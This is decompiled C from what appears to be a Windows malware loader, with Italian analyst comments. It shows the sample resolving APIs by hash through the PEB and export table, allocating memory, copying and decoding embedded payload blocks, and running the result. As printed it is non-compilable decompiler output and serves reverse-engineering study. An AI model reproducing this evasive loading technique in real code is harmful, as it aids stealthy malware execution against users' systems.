
void other_api_call2(void)

{
	uint8_t uVar1;
	int iVar2;
	int iVar3;
	int iVar4;
	code *page_allocated;
	undefined *page_allocated2;
	uint8_t *puVar7;
	undefined *puVar8;
	int iVar9;
	int function_6a75788;
	code *virtual_free;
	uint uVar12;
	int unaff_FS_OFFSET;
	code *virtual_free;
	code *virtual_alloc;
	code *virtual_free;
	code *virtual_alloc;
	short *base_address;

	base_address = *(short **)(*(int *)**(undefined4 **)(*(int *)(*(int *)(unaff_FS_OFFSET + 0x30) + 0xc) + 0xc) + 0x18);
	if (base_address != (short *)0x0)
	{
		if (*base_address == 0x5a4d)
		{
			if (*(int *)(*(int *)(base_address + 0x1e) + (int)base_address) == 0x4550)
			{
				function_6a75788 = *(int *)(*(int *)(base_address + 0x1e) + 0x78 + (int)base_address) +
								   (int)base_address;
				if (function_6a75788 == 0)
				{
					virtual_alloc = (code *)0x0;
				}
				else
				{
					iVar2 = *(int *)(function_6a75788 + 0x1c);
					uVar12 = 0;
					iVar3 = *(int *)(function_6a75788 + 0x20);
					iVar4 = *(int *)(function_6a75788 + 0x24);
					if (*(int *)(function_6a75788 + 0x18) != 0)
					{
						do
						{
							iVar9 = 0;
							puVar7 = (uint8_t *)(*(int *)((int)base_address + uVar12 * 4 + iVar3) + (int)base_address);
							if (puVar7 != (uint8_t *)0x0)
							{
								uVar1 = *puVar7;
								while (uVar1 != '\0')
								{
									iVar9 = iVar9 + 1;
									uVar1 = puVar7[iVar9];
								}
							}
							iVar9 = hasher(puVar7, iVar9);
							if (iVar9 == 0x7fdb33b8)
							{
								virtual_alloc = (code *)(*(int *)((int)base_address +
																  (uint) * (ushort *)((int)base_address + uVar12 * 2 + iVar4) * 4 +
																  iVar2) +
														 (int)base_address);
								goto LAB_00429a45;
							}
							uVar12 = uVar12 + 1;
						} while (uVar12 < *(uint *)(function_6a75788 + 0x18));
					}
					virtual_alloc = (code *)0x0;
				}
			}
			else
			{
				virtual_alloc = (code *)0x0;
			}
		}
		else
		{
			virtual_alloc = (code *)0x0;
		}
	LAB_00429a45:
		if (((*base_address == 0x5a4d) &&
			 (*(int *)(*(int *)(base_address + 0x1e) + (int)base_address) == 0x4550)) &&
			(function_6a75788 = *(int *)(*(int *)(base_address + 0x1e) + 0x78 + (int)base_address) +
								(int)base_address,
			 function_6a75788 != 0))
		{
			iVar2 = *(int *)(function_6a75788 + 0x1c);
			uVar12 = 0;
			iVar3 = *(int *)(function_6a75788 + 0x20);
			iVar4 = *(int *)(function_6a75788 + 0x24);
			if (*(int *)(function_6a75788 + 0x18) != 0)
			{
				do
				{
					iVar9 = 0;
					puVar7 = (uint8_t *)(*(int *)((int)base_address + uVar12 * 4 + iVar3) + (int)base_address);
					if (puVar7 != (uint8_t *)0x0)
					{
						uVar1 = *puVar7;
						while (uVar1 != '\0')
						{
							iVar9 = iVar9 + 1;
							uVar1 = puVar7[iVar9];
						}
					}
					iVar9 = hasher(puVar7, iVar9);
					if (iVar9 == 0x1d499ba0)
					{
						virtual_free = (code *)(*(int *)((int)base_address +
														 (uint) * (ushort *)((int)base_address + uVar12 * 2 + iVar4) * 4 + iVar2) +
												(int)base_address);
						goto LAB_00429acf;
					}
					uVar12 = uVar12 + 1;
				} while (uVar12 < *(uint *)(function_6a75788 + 0x18));
			}
		}
		virtual_free = (code *)0x0;
	LAB_00429acf:
		if (((*base_address == 0x5a4d) &&
			 (*(int *)(*(int *)(base_address + 0x1e) + (int)base_address) == 0x4550)) &&
			(function_6a75788 = *(int *)(*(int *)(base_address + 0x1e) + 0x78 + (int)base_address) +
								(int)base_address,
			 function_6a75788 != 0))
		{
			iVar2 = *(int *)(function_6a75788 + 0x1c);
			uVar12 = 0;
			iVar3 = *(int *)(function_6a75788 + 0x20);
			iVar4 = *(int *)(function_6a75788 + 0x24);
			if (*(int *)(function_6a75788 + 0x18) != 0)
			{
				do
				{
					iVar9 = 0;
					puVar7 = (uint8_t *)(*(int *)((int)base_address + uVar12 * 4 + iVar3) + (int)base_address);
					if (puVar7 != (uint8_t *)0x0)
					{
						uVar1 = *puVar7;
						while (uVar1 != '\0')
						{
							iVar9 = iVar9 + 1;
							uVar1 = puVar7[iVar9];
						}
					}
					iVar9 = hasher(puVar7, iVar9);
					if (iVar9 == 0x6a75788)
					{
						function_6a75788 = *(int *)((int)base_address +
													(uint) * (ushort *)((int)base_address + uVar12 * 2 + iVar4) * 4 + iVar2) +
										   (int)base_address;
						goto LAB_00429b6e;
					}
					uVar12 = uVar12 + 1;
				} while (uVar12 < *(uint *)(function_6a75788 + 0x18));
			}
		}
		function_6a75788 = 0;
	LAB_00429b6e:
		if (((virtual_alloc != (code *)0x0) && (virtual_free != (code *)0x0)) && (function_6a75788 != 0))
		{
			virtual_free = (code *)0x57000;
			virtual_alloc = (code *)0x0;

			page_allocated = (code *)(*virtual_alloc)(0, 0x57000, 0x3000, 4); //alloca pagine utilizzabili anche come codice


			if (page_allocated != (code *)0x0)
			{
				uVar12 = 0;
				do
				{
					page_allocated[uVar12] = (code)0x0;
					uVar12 = uVar12 + 1;
				} while (uVar12 < 0x57000);
				virtual_free = (code *)0x80;
				page_allocated2 = (code *)(*virtual_alloc)(0, 0x80, 0x3000, 4); //qui fa la stessa cosa ma per 0x80 byte
				if (page_allocated2 != (undefined *)0x0)
				{
					uVar12 = 0;
					do
					{
						page_allocated2[uVar12] = 0;
						uVar12 = uVar12 + 1;
					} while (uVar12 < 0x80); //mette a zero i 0x80 byte
					if ((page_allocated2 < &DAT_00436768) || ((undefined *)0x4367e7 < page_allocated2))
					{
						uVar12 = 0;
						do
						{
							page_allocated2[uVar12] = (page_allocated2 + uVar12)[(int)&DAT_00436768 - (int)page_allocated2];
							uVar12 = uVar12 + 1;
							virtual_free = virtual_free;
						} while (uVar12 < 0x80); //ora gli mette i dati in DAT_00436768
					}
					else
					{
						function_6a75788 = 0x80;
						puVar8 = page_allocated2 + 0x7f;
						do
						{
							*puVar8 = puVar8[(int)&DAT_00436768 - (int)page_allocated2];
							function_6a75788 = function_6a75788 + -1;
							puVar8 = puVar8 + -1;
						} while (function_6a75788 != 0);
					}
					page_allocated3 = (code *)(*virtual_alloc)(0, 0x57000, 0x3000, 4); //altro errore del decompilatore dovrebbe essere virtual_alloc
					if (page_allocated3 != (code *)0x0)
					{
						if ((page_allocated3 < &DAT_004374c8) || ((code *)0x48e4c7 < page_allocated3))
						{
							uVar12 = 0;
							do
							{
								page_allocated3[uVar12] = (page_allocated3 + uVar12)[(int)&DAT_004374c8 - (int)page_allocated3];
								uVar12 = uVar12 + 1;
							} while (uVar12 < 0x57000); //copia i dati in DAT_004374c8
						}
						else
						{
							function_6a75788 = 0x57000;
							page_allocated3 = page_allocated3 + 0x56fff;
							do
							{
								*page_allocated3 = page_allocated3[(int)&DAT_004374c8 - (int)page_allocated3];
								function_6a75788 = function_6a75788 + -1;
								page_allocated3 = page_allocated3 + -1;
								page_allocated = virtual_alloc;
							} while (function_6a75788 != 0);
						}
						FUN_00428590(page_allocated2, 0x80); //probabilmente era una shellcode questa funzione è piena di codide
						if ((page_allocated < page_allocated3) || (page_allocated3 + 0x57000 <= page_allocated))
						{
							uVar12 = 0;
							do
							{
								page_allocated[uVar12] = (page_allocated + uVar12)[(int)page_allocated3 - (int)page_allocated];
								uVar12 = uVar12 + 1;
								page_allocated = page_allocated;
							} while (uVar12 < 0x57000);
						}
						else
						{
							function_6a75788 = 0x57000;
							page_allocated3 = page_allocated + 0x56fff;
							do
							{
								*page_allocated3 = page_allocated3[(int)page_allocated3 - (int)page_allocated];
								function_6a75788 = function_6a75788 + -1;
								page_allocated3 = page_allocated3 + -1;
							} while (function_6a75788 != 0);
						}
						(*virtual_free)(page_allocated2, 0, 0x8000); 
						(*virtual_free)(page_allocated3, 0, 0x8000);//questa sono le rispettive virtualFree
						returned_virtual_free = (code *)more_api_call(); //more api call ritorna una funzione
						(*returned_virtual_free)(page_allocated);
						(*virtual_free)(page_allocated, 0, 0x8000);
						return;
					}
					(*page_allocated3)(page_allocated2, 0, 0x8000);
					page_allocated3 = page_allocated3;
				}
				(*page_allocated3)(page_allocated, 0, 0x8000);
				return;
			}
		}
	}
	return;
}
